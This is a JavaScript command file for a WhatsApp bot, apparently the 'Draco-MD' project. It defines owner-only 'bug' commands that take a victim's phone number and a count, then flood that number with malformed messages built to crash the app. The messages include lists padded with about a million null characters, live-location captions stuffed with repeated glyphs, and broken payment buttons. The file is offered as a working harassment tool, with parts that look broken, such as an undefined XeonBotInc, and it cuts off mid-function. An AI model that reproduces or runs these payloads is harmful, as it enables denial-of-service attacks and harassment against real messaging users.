const {cmd , commands} = require('../command')
const { botwatermark } = require('../botwatermark')
const {readEnv} = require('../lib/database')
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require('@whiskeysockets/baileys')
const {sleep} = require('../lib/functions')
const fs = require('fs')


cmd({
    pattern: "dandroid",
    desc: "Send bugs.",
    category: "bug",
    filename: __filename
},
async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

const config = await readEnv();

const victimnb = q.split(",")[0] + "@s.whatsapp.net"
const amount = q.split(",")[1]
const sq = q.search(",")

if(!isOwner) {
	await m.react("❌")
	return reply(`*❗ Tʜɪꜱ Iꜱ Oᴡɴᴇʀ Cᴏᴍᴍᴀɴᴅ. ❗*`)
}
else if(!q || !amount || sq == -1) {
	await m.react("❌")
	return reply(`*❗ Gɪᴠᴇ Nᴜᴍʙᴇʀ Aɴᴅ Aᴍᴏᴜɴᴛ Tᴏ Sᴇɴᴅ Bᴜɢꜱ.*\n*❗ Exᴀᴍᴘʟᴇ : ${config.PREFIX}dandroid 947########,5*`)
}
else if(!q.length > 7) {
	await m.react("❌")
	return reply("*❗ Iɴᴄᴏʀʀᴇᴄᴛ Nᴜᴍʙᴇʀ. Eɴᴛᴇʀ Tʜᴇ Cᴏʀʀᴇᴄᴛ Nᴜᴍʙᴇʀ ❗*")
}

await conn.sendMessage(from,
{ text: `*🔄 Pʟᴇᴀꜱᴇ Wᴀɪᴛ Bᴜɢ Iꜱ Iɴ Pʀᴏᴄᴇꜱꜱ...*`,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: false, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `|| 🐲 Dʀᴀᴄᴏ-Mᴅ Bᴜɢꜱ 🐲 ||`,
"body": ``,
"previewType": "PHOTO",
"thumbnailUrl": `https://i.ibb.co/4pMkfvD/1727092453418.png`,
"thumbnail": ``,
"sourceUrl": ``}}},
{ quoted: mek})

async function sendListMessage(victimnb) {
  var messageContent = generateWAMessageFromContent(victimnb, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': victimnb
  });
  
  await conn.relayMessage(victimnb, messageContent.message, {
    'participant': {
      'jid': victimnb
    },
    'messageId': messageContent.key.id
  });
          }

async function sendLiveLocationMessage(victimnb) {
  var messageContent = generateWAMessageFromContent(victimnb, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': victimnb
  });
  
  await conn.relayMessage(victimnb, messageContent.message, {
    'participant': {
      'jid': victimnb
    },
    'messageId': messageContent.key.id
  });
}

async function sendSystemCrashMessage(victimnb) {
  var messageContent = generateWAMessageFromContent(victimnb, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': victimnb
  });
  await conn.relayMessage(victimnb, messageContent.message, {
    'participant': {
      'jid': victimnb
    },
    'messageId': messageContent.key.id
  });
      }

async function sendVariousMessages(victimnb, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(victimnb);
    sendLiveLocationMessage(victimnb);
    sendSystemCrashMessage(victimnb);
    await sleep(500);
  }
      }

await sleep(1500)
  sendVariousMessages(victimnb, amount)
await sleep(2500)

await conn.sendMessage(from,{text: `*✅ Sᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ Sᴇɴᴛ Bᴜɢꜱ Tᴏ ${victimnb}.*\n\n\n${botwatermark}`})

}catch(e){
console.log(e)
reply(`${e}`)
}
})


cmd({
    pattern: "dsysuicrash",
    desc: "Send bugs.",
    category: "bug",
    filename: __filename
},
async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

const victimnb = q.split(",")[0] + "@s.whatsapp.net"
const amount = q.split(",")[1]
const sq = q.search(",")

if(!isOwner) {
	await m.react("❌")
	return reply(`*❗ Tʜɪꜱ Iꜱ Oᴡɴᴇʀ Cᴏᴍᴍᴀɴᴅ. ❗*`)
}
else if(!q || !amount || sq == -1) {
	await m.react("❌")
	return reply(`*❗ Gɪᴠᴇ Nᴜᴍʙᴇʀ Aɴᴅ Aᴍᴏᴜɴᴛ Tᴏ Sᴇɴᴅ Bᴜɢꜱ.*\n*❗ Exᴀᴍᴘʟᴇ : ${config.PREFIX}dsysuicrash 947########,5*`)
}
else if(!q.length > 7) {
	await m.react("❌")
	return reply("*❗ Iɴᴄᴏʀʀᴇᴄᴛ Nᴜᴍʙᴇʀ. Eɴᴛᴇʀ Tʜᴇ Cᴏʀʀᴇᴄᴛ Nᴜᴍʙᴇʀ ❗*")
}

await conn.sendMessage(from,
{ text: `*🔄 Pʟᴇᴀꜱᴇ Wᴀɪᴛ Bᴜɢ Iꜱ Iɴ Pʀᴏᴄᴇꜱꜱ...*`,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: false, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `|| 🐲 Dʀᴀᴄᴏ-Mᴅ Bᴜɢꜱ 🐲 ||`,
"body": ``,
"previewType": "PHOTO",
"thumbnailUrl": `https://i.ibb.co/4pMkfvD/1727092453418.png`,
"thumbnail": ``,
"sourceUrl": ``}}},
{ quoted: mek})

async function sendListMessage(victimnb) {
  var messageContent = generateWAMessageFromContent(victimnb, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': victimnb
  });
  
  await conn.relayMessage(victimnb, messageContent.message, {
    'participant': {
      'jid': victimnb
    },
    'messageId': messageContent.key.id
  });
          }

async function sendLiveLocationMessage(victimnb) {
  var messageContent = generateWAMessageFromContent(victimnb, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': victimnb
  });
  
  await conn.relayMessage(victimnb, messageContent.message, {
    'participant': {
      'jid': victimnb
    },
    'messageId': messageContent.key.id
  });
}

async function sendSystemCrashMessage(victimnb) {
  var messageContent = generateWAMessageFromContent(victimnb, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': victimnb
  });
  await conn.relayMessage(victimnb, messageContent.message, {
    'participant': {
      'jid': victimnb
    },
    'messageId': messageContent.key.id
  });
      }

async function sendMixedMessages(victimnb, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(victimnb);
    sendListMessage(victimnb);
    await sleep(500);
  }
    }

await sleep(2000)
  sendMixedMessages(victimnb, amount)
await sleep(2500)

await conn.sendMessage(from,{text: `*✅ Sᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ Sᴇɴᴛ Bᴜɢꜱ Tᴏ ${victimnb}.*\n\n\n${botwatermark}`})

}catch(e){
console.log(e)
reply(`${e}`)
}
})

cmd({
    pattern: "dsysui",
    desc: "Send bugs.",
    category: "bug",
    filename: __filename
},
async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

const config = await readEnv();

const victimnb = q.split(",")[0] + "@s.whatsapp.net"
const amount = q.split(",")[1]
const sq = q.search(",")

if(!isOwner) {
	await m.react("❌")
	return reply(`*❗ Tʜɪꜱ Iꜱ Oᴡɴᴇʀ Cᴏᴍᴍᴀɴᴅ. ❗*`)
}
else if(!q || !amount || sq == -1) {
	await m.react("❌")
	return reply(`*❗ Gɪᴠᴇ Nᴜᴍʙᴇʀ Aɴᴅ Aᴍᴏᴜɴᴛ Tᴏ Sᴇɴᴅ Bᴜɢꜱ.*\n*❗ Exᴀᴍᴘʟᴇ : ${config.PREFIX}dsysui 947########,5*`)
}
else if(!q.length > 7) {
	await m.react("❌")
	return reply("*❗ Iɴᴄᴏʀʀᴇᴄᴛ Nᴜᴍʙᴇʀ. Eɴᴛᴇʀ Tʜᴇ Cᴏʀʀᴇᴄᴛ Nᴜᴍʙᴇʀ ❗*")
}

await conn.sendMessage(from,
{ text: `*🔄 Pʟᴇᴀꜱᴇ Wᴀɪᴛ Bᴜɢ Iꜱ Iɴ Pʀᴏᴄᴇꜱꜱ...*`,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: false, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `|| 🐲 Dʀᴀᴄᴏ-Mᴅ Bᴜɢꜱ 🐲 ||`,
"body": ``,
"previewType": "PHOTO",
"thumbnailUrl": `https://i.ibb.co/4pMkfvD/1727092453418.png`,
"thumbnail": ``,
"sourceUrl": ``}}},
{ quoted: mek})

async function sendSystemCrashMessage(victimnb) {
  var messageContent = generateWAMessageFromContent(victimnb, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': victimnb
  });
  await conn.relayMessage(victimnb, messageContent.message, {
    'participant': {
      'jid': victimnb
    },
    'messageId': messageContent.key.id
  });
      }

async function sendRepeatedMessages2(victimnb, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(victimnb);
    sendSystemCrashMessage(victimnb);
    sendSystemCrashMessage(victimnb);
    await sleep(500);
  }
}

await sleep(2000)
  sendRepeatedMessages2(victimnb, amount)
await sleep(2500)

await conn.sendMessage(from,{text: `*✅ Sᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ Sᴇɴᴛ Bᴜɢꜱ Tᴏ ${victimnb}.*\n\n\n${botwatermark}`})

}catch(e){
console.log(e)
reply(`${e}`)
}
})

cmd({
    pattern: "dpayment",
    desc: "Send dpayment bug.",
    category: "bug",
    filename: __filename
},
async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

const config = await readEnv();

if(!isOwner) {
	await m.react("❌")
	return reply(`*❗ Tʜɪꜱ Iꜱ Oᴡɴᴇʀ Cᴏᴍᴍᴀɴᴅ. ❗*`)
}
else if(!q) {
	await m.react("❌")
	return reply(`*❗ Gɪᴠᴇ Nᴜᴍʙᴇʀ Tᴏ Sᴇɴᴅ Bᴜɢꜱ.*\n*❗ Exᴀᴍᴘʟᴇ : ${config.PREFIX}dpayment 947########*`)
}
else if(!q.length > 7) {
	await m.react("❌")
	return reply("*❗ Iɴᴄᴏʀʀᴇᴄᴛ Nᴜᴍʙᴇʀ. Eɴᴛᴇʀ Tʜᴇ Cᴏʀʀᴇᴄᴛ Nᴜᴍʙᴇʀ ❗*")
}

const victimnb = q + "@s.whatsapp.net"

await conn.sendMessage(from,
{ text: `*🔄 Pʟᴇᴀꜱᴇ Wᴀɪᴛ Bᴜɢ Iꜱ Iɴ Pʀᴏᴄᴇꜱꜱ...*`,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: false, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `|| 🐲 Dʀᴀᴄᴏ-Mᴅ Bᴜɢꜱ 🐲 ||`,
"body": ``,
"previewType": "PHOTO",
"thumbnailUrl": `https://i.ibb.co/4pMkfvD/1727092453418.png`,
"thumbnail": ``,
"sourceUrl": ``}}},
{ quoted: mek})

async function xeonBugPay(victimnb){
				await conn.relayMessage(
					victimnb,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: victimnb } },
					{ messageId: null }
				);
				}
				await xeonBugPay(victimnb);

await conn.sendMessage(from,{text: `*✅ Sᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ Sᴇɴᴛ Bᴜɢꜱ Tᴏ ${q}.*\n\n\n${botwatermark}`})

}catch(e){
console.log(e)
reply(`${e}`)
}
})

cmd({
    pattern: "doneshot",
    desc: "Send bugs.",
    category: "bug",
    filename: __filename
},
async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

const config = await readEnv();

if(!isOwner) {
	await m.react("❌")
	return reply(`*❗ Tʜɪꜱ Iꜱ Oᴡɴᴇʀ Cᴏᴍᴍᴀɴᴅ. ❗*`)
}
else if(!q) {
	await m.react("❌")
	return reply(`*❗ Gɪᴠᴇ Nᴜᴍʙᴇʀ Tᴏ Sᴇɴᴅ Bᴜɢꜱ.*\n*❗ Exᴀᴍᴘʟᴇ : ${config.PREFIX}doneshot 947########*`)
}
else if(!q.length > 7) {
	await m.react("❌")
	return reply("*❗ Iɴᴄᴏʀʀᴇᴄᴛ Nᴜᴍʙᴇʀ. Eɴᴛᴇʀ Tʜᴇ Cᴏʀʀᴇᴄᴛ Nᴜᴍʙᴇʀ ❗*")
}

const victimnb = q + "@s.whatsapp.net"

await conn.sendMessage(from,
{ text: `*🔄 Pʟᴇᴀꜱᴇ Wᴀɪᴛ Bᴜɢ Iꜱ Iɴ Pʀᴏᴄᴇꜱꜱ...*`,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: false, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `|| 🐲 Dʀᴀᴄᴏ-Mᴅ Bᴜɢꜱ 🐲 ||`,
"body": ``,
"previewType": "PHOTO",
"thumbnailUrl": `https://i.ibb.co/4pMkfvD/1727092453418.png`,
"thumbnail": ``,
"sourceUrl": ``}}},
{ quoted: mek})

async function xeonIosShot(victimnb) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await conn.relayMessage(victimnb,
						{
							extendedTextMessage: {
								text: '🦄드림 가이 Xeon',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description: '🦄드림 가이 Xeon  🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon',
								title: '🦄드림 가이 Xeon',
								textArgb: 0xff000000,
								backgroundArgb: 0xffffffff,
								font: 1,
								previewType: 0,
								jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
								contextInfo: {
								},
								doNotPlayInline: false,
								thumbnailDirectPath: 'https://example.com/thumb.jpg',
								thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
								thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
								mediaKey: Buffer.from(
									'abcdef1234567890abcdef1234567890',
									'hex'
								),
								mediaKeyTimestamp: Date.now(),
								thumbnailHeight: 200,
								thumbnailWidth: 200,
								inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
								inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
								inviteLinkParentGroupThumbnailV2: Buffer.from(
									'abcdef1234567890',
									'hex'
								),
								inviteLinkGroupTypeV2: 0,
								viewOnce: true,
							},
						},
						{ participant: { jid: victimnb } }
					);
				}
	for (let i = `3`; i !== 0; i -= 1) {
       await XeonBotInc.relayMessage(
					victimnb,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"🦄드림 가이 Xeon","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: victimnb } },
					{ messageId: null }
				);
				}
				for (let i = `3`; i !== 0; i -= 1) {
					await conn.relayMessage(
						victimnb,
						{
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										header: {
											title: '',
											subtitle: ' ',
										},
										body: {
											text: '🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon',
										},
										footer: {
											text: 'xp',
										},
										nativeFlowMessage: {
											buttons: [
												{
													name: 'cta_url',
													buttonParamsJson:
														"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }",
												},
											],
											messageParamsJson: '\0'.repeat(1000000),
										},
									},
								},
							},
						},
						{ participant: { jid: victimnb } }
					);
					}
	       }
	
await conn.sendMessage(from,{text: `*✅ Sᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ Sᴇɴᴛ Bᴜɢꜱ Tᴏ ${victimnb}.*\n\n\n${botwatermark}`})

}catch(e){
console.log(e)
reply(`${e}`)
}
})

cmd({
    pattern: "donekill",
    desc: "Send bug.",
    category: "bug",
    filename: __filename
},
async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

const config = await readEnv();

if(!isOwner) {
	await m.react("❌")
	return reply(`*❗ Tʜɪꜱ Iꜱ Oᴡɴᴇʀ Cᴏᴍᴍᴀɴᴅ. ❗*`)
}
else if(!q) {
	await m.react("❌")
	return reply(`*❗ Gɪᴠᴇ Nᴜᴍʙᴇʀ Tᴏ Sᴇɴᴅ Bᴜɢꜱ.*\n*❗ Exᴀᴍᴘʟᴇ : ${config.PREFIX}donekill 947########*`)
}
else if(!q.length > 7) {
	await m.react("❌")
	return reply("*❗ Iɴᴄᴏʀʀᴇᴄᴛ Nᴜᴍʙᴇʀ. Eɴᴛᴇʀ Tʜᴇ Cᴏʀʀᴇᴄᴛ Nᴜᴍʙᴇʀ ❗*")
}

const victimnb = q + "@s.whatsapp.net"

await conn.sendMessage(from,
{ text: `*🔄 Pʟᴇᴀꜱᴇ Wᴀɪᴛ Bᴜɢ Iꜱ Iɴ Pʀᴏᴄᴇꜱꜱ...*`,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: false, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `|| 🐲 Dʀᴀᴄᴏ-Mᴅ Bᴜɢꜱ 🐲 ||`,
"body": ``,
"previewType": "PHOTO",
"thumbnailUrl": `https://i.ibb.co/4pMkfvD/1727092453418.png`,
"thumbnail": ``,
"sourceUrl": ``}}},
{ quoted: mek})

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🦄드림 가이 Xeon`
}
}
}

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`media/pornhub.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`media/pornhub.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

async function listxeonfck(victimnb, kuwoted) {
 var etc = generateWAMessageFromContent(victimnb, proto.Message.fromObject({
  'listMessage': {
    'title': "🦄드림 가이 Xeon"+"".repeat(920000),
        'footerText': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
        'description': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: victimnb, quoted: oneclickxeon });
await conn.relayMessage(victimnb, etc.message, { participant: { jid: victimnb }, messageId: etc.key.id });
}

async function locationxeony(victimnb, kuwoted) {
var etc = generateWAMessageFromContent(victimnb, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: victimnb, quoted: kuwoted })
await conn.relayMessage(victimnb, etc.message, { participant: { jid: victimnb }, messageId: etc.key.id })
}

async function xeonkillpic(victimnb, kuwoted) {
 var etc = generateWAMessageFromContent(victimnb, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🦄드림 가이 Xeon",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: conn.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🦄드림 가이 Xeon"
      },
      nativeFlowMessage: {
        messageParamsJson: "".repeat(1000000)
      }
    }
}), { userJid: victimnb, quoted: kuwoted });
await conn.relayMessage(victimnb, etc.message, { participant: { jid: victimnb }, messageId: etc.key.id });
}

async function blackening(victimnb, kuwoted) {
 var etc = generateWAMessageFromContent(victimnb, proto.Message.fromObject({
  "stickerMessage": {
